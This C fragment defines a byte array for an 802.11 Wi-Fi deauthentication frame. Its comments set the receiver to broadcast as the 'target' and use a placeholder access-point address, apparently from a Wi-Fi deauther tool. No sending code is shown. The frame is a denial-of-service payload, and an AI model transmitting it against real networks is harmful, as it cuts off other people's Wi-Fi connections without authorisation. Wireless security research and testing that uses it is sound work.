uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,//reciever (target)
      /* 10 - 15 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, //source (ap)
      /* 16 - 21 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x01, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
};